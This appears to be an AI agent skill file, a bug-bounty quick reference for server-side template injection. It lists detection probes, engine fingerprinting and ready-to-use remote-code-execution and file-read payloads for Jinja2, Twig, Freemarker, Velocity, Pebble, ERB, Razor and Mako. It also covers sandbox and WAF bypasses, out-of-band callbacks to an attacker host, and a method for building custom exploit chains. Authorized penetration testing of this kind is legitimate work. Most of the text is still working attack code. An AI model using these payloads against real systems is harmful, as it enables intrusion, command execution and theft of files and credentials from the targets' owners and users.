---
name: ssti-testing
description: "Server-Side Template Injection hunting — Jinja2/Twig/Freemarker/Velocity/ERB/Razor/Pebble/Mako. Use when testing input reflection in template-rendered pages, email templates, PDF generators, CMS page builders, or any endpoint with reflected user input processed server-side."
---

# SSTI (Server-Side Template Injection) — Bug Bounty Reference

> Source: Intigriti blog + field experience. Quick-ref for pentest sessions.

## Crown Jewel Targets

SSTI pays highest when it chains to RCE. Priority targets:
- **CMS page builders / custom theme editors** — user-controlled templates rendered server-side (WordPress Twig, target-corp Liquid, custom engines)
- **Email notification customizers** — invite templates, notification builders where org admins set template content
- **PDF/report generators** — WeasyPrint, wkhtmltopdf, xhtml2pdf with Jinja2/Twig backend
- **Search functionality** — reflected query in template-rendered error or results page
- **Profile fields** — name/bio/signature rendered in emails or dashboards via templates
- **SaaS multi-tenant** — one org's SSTI can leak other tenants' data via shared template context
- **Salesforce Marketing Cloud** — AMPscript/SSJS/GTL injection → see `references/sfmc-ssti-crypto-attacks.md`

**Asset types that pay most:** Endpoints where user text is rendered in a non-trivial page (not plain HTML echo). Look for template syntax in responses (`{{`, `${`, `<%`).

## Attack Surface Signals

**URL patterns suggesting template rendering:**
```
/template/preview?content=
/email/customize
/report/generate?title=
/page/edit (CMS builders)
/search?q= (reflected in results page)
/profile (bio/name fields rendered elsewhere)
/invoice/render?memo=
/notification/settings (custom message templates)
```

**Response signals:**
- Template syntax visible in source: `{{`, `${`, `<%=`, `#{`
- Error messages mentioning: Jinja2, Twig, Freemarker, Velocity, ERB, Mako, Pebble
- `X-Powered-By: Express` + `{{` in responses → possible Pug/EJS
- Python framework (Flask/Django) + reflected input → Jinja2 likely
- PHP framework (Symfony/Laravel) + reflected input → Twig likely
- Java framework (Spring) + reflected input → Freemarker/Velocity/Thymeleaf

**Tech stack indicators:**
- Flask/Django → Jinja2
- Symfony/Laravel → Twig
- Spring Boot → Freemarker, Velocity, or Thymeleaf
- Ruby on Rails → ERB
- .NET → Razor
- Node.js/Express → Pug, EJS, Handlebars

## Detection

### Universal Polyglot
```
${{<%[%'"}}%\.
```

### Mathematical Probes (inject in every input field)
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
@(7*7)
```

If `49` appears in response → SSTI confirmed. Next: identify engine.

### Error-Triggering Characters
```
{ } $ # @ %) " ' | {{ }} ${ <% <%= %>
```
Template errors often leak engine name/version.

## Engine Fingerprinting

```
{{7*'7'}} → 7777777  → Jinja2 (Python)
{{7*'7'}} → 49       → Twig (PHP)
${7*7}    → 49       → Freemarker/Velocity (Java)
<%= 7*7 %> → 49      → ERB (Ruby)
#{7*7}    → 49       → Pebble (Java) / Slim (Ruby)
@(7*7)    → 49       → Razor (.NET)
```

Decision tree: `{{7*'7'}}` differentiates Jinja2 vs Twig. `${7*7}` vs `<%= %>` for Java vs Ruby.

## Jinja2 (Python — Flask/Django)

### RCE via MRO chain
```python
{{''.__class__.__mro__[1].__subclasses__()}}
```
Find `subprocess.Popen` or `os._wrap_close` in the list (usually index ~400+):
```python
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}
```

### RCE via config/request objects (Flask)
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}
```

### RCE via lipsum (Flask shortcut)
```python
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
```

### Bypass `_` filter
```python
{{request|attr('application')|attr('\x5f\x5fself\x5f\x5f')}}
```

### Bypass `[]` filter
```python
{{''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()|list}}
```

### File read
```python
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

## Twig (PHP — Symfony/Laravel)

### Enumerate available variables
```twig
{{_context|keys|join(',')}}
```

### RCE (Twig < 3.x or misconfigured)
```twig
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### RCE — Sandbox bypass via block+map
```twig
{%block X%}idINTIGRITIsystem{%endblock%}{%set y=block('X')|split('INTIGRITI')%}{{[y|first]|map(y|last)|join}}
```
Trick: concatenate command+function in a block, split, then use `map()` filter to call.

### File read via custom objects
```twig
{{files.get_style_sheet('../../../../../etc/passwd')}}
{{secrets.MYSQL_PASSWD}}
```

### Twig 3.x — filter() RCE
```twig
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('exec')}}
```

## Freemarker (Java)

### RCE via Execute
```freemarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### RCE via ObjectConstructor
```freemarker
<#assign obj="freemarker.template.utility.ObjectConstructor"?new()>
${obj("java.lang.Runtime").getRuntime().exec("id")}
```

### File read
```freemarker
<#assign f=object("java.io.File", "/etc/passwd")>
<#assign br=object("java.io.BufferedReader", object("java.io.FileReader", f))>
<#list 1..999 as _><#assign line=br.readLine()!><#if line?has_content>${line}
</#if></#list>
```

### Sandbox bypass — new() built-in
```freemarker
${"freemarker.template.utility.Execute"?new()("id")}
```

## Velocity (Java)

### RCE
```velocity
#set($cmd='id')
#set($rt=$class.forName('java.lang.Runtime'))
#set($obj=$rt.getMethod('getRuntime',null).invoke(null,null))
$obj.exec($cmd)
```

### Alternative via ProcessBuilder
```velocity
#set($pb=new java.lang.ProcessBuilder(java.util.Arrays.asList('id')))
#set($process=$pb.start())
```

## Pebble (Java)

### RCE
```pebble
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 'UTF-8') }}
```

## ERB (Ruby)

### RCE
```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
```

### File read
```erb
<%= File.read('/etc/passwd') %>
```

## Razor (.NET)

### RCE
```csharp
@{var p=new System.Diagnostics.Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c id";p.StartInfo.RedirectStandardOutput=true;p.Start();@p.StandardOutput.ReadToEnd()}
```

## Sandbox Escape Strategies

1. **MRO/subclass chain** (Jinja2): Walk class hierarchy to find dangerous classes
2. **Global objects**: `config`, `request`, `lipsum`, `cycler` in Flask
3. **Block+split+map** (Twig): Reconstruct function calls from string manipulation
4. **Reflection** (Java engines): `Class.forName()`, `getMethod()`, `invoke()`
5. **Custom objects**: Enumerate `_context` (Twig), check for exposed app objects
6. **Filter abuse**: `|attr()`, `|map()`, `|filter()` to bypass keyword blacklists

## Bug Bounty Testing Flow

1. **Inject polyglot** in every user input (names, emails, profile fields, search, headers)
2. **Check reflected output** — rendered `49` or template error?
3. **Fingerprint engine** via `{{7*'7'}}` differential
4. **Escalate to file read** → prove impact
5. **Escalate to RCE** → `id` / `whoami` output
6. **Screenshot + Burp Repeater** evidence
7. **Check for blind SSTI**: no direct output? Try OOB callback via `curl ATTACKER` in payload

## Common Locations

- Profile name/bio fields
- Email templates (invite, notification customization)
- CMS page builders / custom themes
- PDF/report generators
- Error pages (404 with path reflection)
- Search functionality with reflected query
- Webhook URL / callback templates

## PortSwigger Academy — Advanced Techniques

- **Detection decision tree**: `{{7*'7'}}` → `49` (Twig) vs `7777777` (Jinja2) — key differentiator
- **Universal fuzz string**: `${{<%[%'"}}%\` — any exception = template processing
- **Code context breakout**: When inside template expression, break with `}}` before injecting
- **ERB file read**: `<%= File.open('/etc/passwd').read %>`
- **ERB directory listing**: `<%= Dir.entries('/') %>`
- **Mako RCE**: `<% import os x=os.popen('id').read() %> ${x}`
- **Velocity RCE via ClassTool**: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("cmd")`
- **Engine identification via error**: Submit `<%=foobar%>` — ERB reveals with "undefined local variable" error

---

## Building a custom exploit when no public payload works

Documented payloads fail on hardened or unusual engines. The systematic route has three stages, and stage two is the one that separates a real assessment from a payload-list sweep.

**1. Read.** Get the engine's own documentation and learn its basic syntax and its security notes. Template engines document their sandbox and its intentional escape hatches; that documentation is written for developers but reads as an exploit guide.

**2. Explore — enumerate what is actually reachable.** Rather than guessing, list the objects the template context exposes. Most engines offer a self-describing construct (a dump/debug filter, iterating the context, or accessing a built-ins namespace). What you are looking for is not just the language's own dangerous classes but **developer-supplied objects** — the application's own helper objects passed into the template. These are undocumented, unhardened, and frequently expose file, database, or HTTP methods that the engine's sandbox never anticipated.

**3. Construct an object chain.** From a benign starting object, walk attributes and methods until you reach something that executes, reads, or writes. In Python this is the classic `.__class__.__mro__[1].__subclasses__()` walk to a `Popen`; in Java it is reaching a `Runtime` or a `ClassLoader`; in Ruby it is the `Object` hierarchy. Each hop is a probe, so keep the chain visible in your notes — the final payload is unreadable, and a triager will need the derivation.

## Operator Notes (Battle-Tested)

- **Blind SSTI is common**: No direct output? Always try OOB via `curl` or DNS callback. SSTI in email templates only renders when email is sent — trigger the action, don't just save the field
- **PDF generators are goldmine**: WeasyPrint/wkhtmltopdf backends often use Jinja2. Test memo/title/description fields on invoice/report generators — chains to SSRF+RCE
- **WAF bypass**: If `{{` is blocked, try `{%` (statement vs expression). Twig `{%block%}` bypass works on most WAFs. Jinja2 `|attr()` filter bypasses underscore blacklists
- **Context matters**: Same engine behaves differently in sandboxed vs unsandboxed mode. Always enumerate available objects/filters before escalating — `{{_context|keys}}` (Twig), `{{config}}` (Flask)
- **Salesforce Marketing Cloud**: Separate attack surface — AMPscript `%%` / SSJS `<script runat="server">` / GTL `{{.datasource}}`. See `references/sfmc-ssti-crypto-attacks.md` for full methodology

## Related Skills & Chains

| When | Go to |
|------|-------|
| SSTI confirmed → need RCE escalation | `command-injection-testing` |
| WAF blocking payloads | `waf-bypass` → `references/waf-generic-evasion.md` |
| SSTI in PDF generator → SSRF possible | `ssrf-testing` → `references/pdf-ssrf.md` |
| Salesforce Marketing Cloud target | `references/sfmc-ssti-crypto-attacks.md` |
| Input via file upload (template file) | `file-upload-testing` |
| Need OOB callback for blind SSTI | Start `interactsh` first — always |
| Found SSTI → hunt siblings 20min | `auto-chain-discovery` — A→B signal |

## Reference files

Read these when the situation calls for the depth they carry — they are not loaded automatically.

- `references/sfmc-ssti-crypto-attacks.md` — **sfmc ssti crypto attacks** — related_patterns:
